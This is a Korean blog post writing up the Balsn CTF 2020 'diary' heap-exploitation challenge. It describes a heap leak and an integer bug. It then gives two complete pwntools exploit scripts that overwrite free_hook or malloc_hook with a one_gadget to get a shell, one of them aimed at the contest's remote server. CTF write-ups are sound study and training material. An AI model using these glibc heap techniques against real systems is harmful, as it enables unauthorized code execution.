---
layout: post
title: Balsn CTF 2020 diary write up
categories: ctf-write-up
tag: [heap, ctf]
---

이 문제는 우분투 19.04의 Heap 문제이다.  힙 문제라 그런지 보호기법은 모두 걸려있다.
![image](https://user-images.githubusercontent.com/43925259/99204639-a3993980-27f9-11eb-873b-4116547fedd2.png)

먼저 이 프로그램엔 2가지의 버그가 존재한다.

첫 번째 버그는 name 값 바로 뒤에 힙 포인터들을 저장함으로써 발생하는 `Heap leak`이다.
두 번째 버그는 Edit 기능에 있는 `Integer issue`이다.

나는 우분투 19.04가 없어서 18.04에서 먼저 익스를 진행했다. BSS 영역에 존재하는 자기 자신을 가리키는 pointer를 이용하여 bss 영역에 원하는 값을 넣을 수가 있었다.

free가 되었는지 확인하는 변수와 힙 포인터들을 덮기 위해선 stdin과 stdout을 덮어야 했다. 이때 이 영역을 'AAAAAA....' 값을 저장해놓은 힙 주소로 덮었더니 printf가 동작하지 않았지만 puts가 동작했다.

이를 이용하여 0x80을 8개 할당하고 8개 해제함으로써 힙에 생기는 libc 주소를 leak하고 `free_hook`을 `one_gadget`으로 덮음으로써 익스를 했다.

코드는 다음과 같다.
```python
from pwn import *

p = process('./diary')
e = ELF('./diary')
libc = e.libc

def get_name():
    p.sendafter(': ', '1')

def Malloc(length, content):
    p.recv()
    p.send('2')
    p.recv(timeout=1)
    p.send(str(length))
    p.recv(timeout=1)
    p.send(content)

def View(page):
    p.recv()
    p.send('3')
    p.recv(timeout=1)
    p.send(str(page))

def Edit(page, content):
    p.recv()
    p.send('4')
    p.recv(timeout=1)
    p.send(str(page))
    p.recv(timeout=1)
    p.send(content)
    
def Free(page):
    p.recv()
    p.send('5')
    p.recv(timeout=1)
    p.send(str(page))

p.sendafter(': ', 'A' * 0x20)

for i in range(8):
    Malloc(0x80, 'B' * 0x80)

for i in range(7, -1, -1):
    Free(i)

get_name()
p.recvuntil('A' * 0x20)
leak = u64(p.recv(6).ljust(8, '\x00'))
print hex(leak)

payload = ''
payload += p32(leak >> 32)
payload += 'A' * 0x10
payload += p64(leak)
payload += 'A' * 8
payload += p64(leak)
payload += 'A' * 0x28
payload += p64(leak + 4)
payload += p64(0) * 28
Edit(-11, payload)

View(0)
leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base = leak - 0x3ebca0 
one_gadget = libc_base + 0x4f3c2

print hex(leak)
print hex(libc_base)

payload = ''
payload += p32(leak >> 32)
payload += 'A' * 0x10
payload += p64(leak)
payload += 'A' * 8
payload += p64(leak)
payload += 'A' * 0x28
payload += p64(libc_base + 0x3ecd98)
payload += p64(0) * 28
Edit(-11, payload)
Edit(0, 'A' * 4 + p64(0) * 361 + p64(one_gadget))

Free(0)
p.interactive()
```

first  blood를 할 수 있을 줄 알고 신나있었지만, 우분투 19.04에선 동작하지 않았다. 18.04와 다르게 19.04는 printf와 puts 둘다 동작하지 않아서 leak이 불가능했다.

그래서 익스 방법을 바꿔서 bss영역이 아닌 stdin 영역을 이용했다. stdin 영역의 뒤를 보면 `malloc_hook`과 `main_arena` 영역이 존재한다.

여기서 `main_arena`에 fastbin을 관리하는 영역이 존재한다. 이 영역에 원하는 힙 주소를 써주면 다음 malloc시에 우리가 써준 영역에 할당 가능하다. (단 fake size를 만들어 주어야 함)

이를 이용하여 chunk를 `overlapping`하여 leak을 하고 `malloc_hook`을 `one_gadget`으로 덮었다.

아마 이것은 언인텐드 풀이일 것이다.
```python
from pwn import *

#p = process('./diary')
p = remote("diary.balsnctf.com", 10101)
e = ELF('./diary')
libc = e.libc

def get_name():
    p.sendafter(': ', '1')

def Malloc(length, content):
    p.sendafter(': ', '2')
    p.sendafter(': ', str(length))
    p.sendafter(': ', content)

def View(page):
    p.sendafter(': ', '3')
    p.sendafter(': ', str(page))

def Edit(page, content):
    p.sendafter(': ', '4')
    p.sendafter(': ', str(page))
    p.sendafter(': ', content)
    
def Free(page):
    p.sendafter(': ', '5')
    p.sendafter(': ', str(page))

p.sendafter(': ', 'A' * 0x20)

for i in range(4):
    Malloc(0x80, '\x00' * 12 + p64(0) + p64(0x41) + (p64(0) + p64(0x61)) * 5)

get_name()
p.recvuntil('A' * 0x20)
leak = u64(p.recv(6).ljust(8, '\x00'))
print hex(leak)

Malloc(0x80, '\x00' * 12 + p64(leak + 0x250) + p64(0) + p64(leak + 0x2d0) + p64(0))
Malloc(0x80, '\x00' * 12 + p64(leak + 0x2e0) + p64(0) + p64(leak + 0x360) + p64(0))
Malloc(0x80, '\x00' * 12 + p64(leak + 0x370) + p64(0) + p64(leak + 0x78) + p64(0))
Malloc(0x80, '\x00' * 12 + p64(0) + p64(0x0) + (p64(0) + p64(0x61))*5)

for i in range(7, -1, -1):
    Free(i)

Malloc(0x30, 'A' * 4 + p64(0x41)) # 8

payload = ''
payload += 'A' * (0x22c - 0x20)
payload += p64(0)
payload += p64(0x71)
payload += p64(0)
payload += p64(0)
payload += p64(0) # malloc_hook
payload += p64(0) * 3
payload += p64(leak) * 4    # 0x20 ~ 0x50
payload += p64(leak + 0x50) # 0x60
payload += p64(leak + 0x70) # 0x70
Edit(-6, payload)

Malloc(52, 'A' * 52) # 9

View(9)
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1e4ca0
print hex(libc_base)

off = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]

one_gadget = libc_base + off[3]

Malloc(0x50, '\x90' * 4 + p64(0x61) + p64(0) + p64(0x71) + p64(leak + 0x240) + p64(libc_base + 0x1e4c10))
Malloc(0x60, p64(0))
Malloc(0x60, '\x90' * 12 + p64(one_gadget))

p.sendafter(': ', '2')
p.sendafter(': ', '10')
p.interactive()
```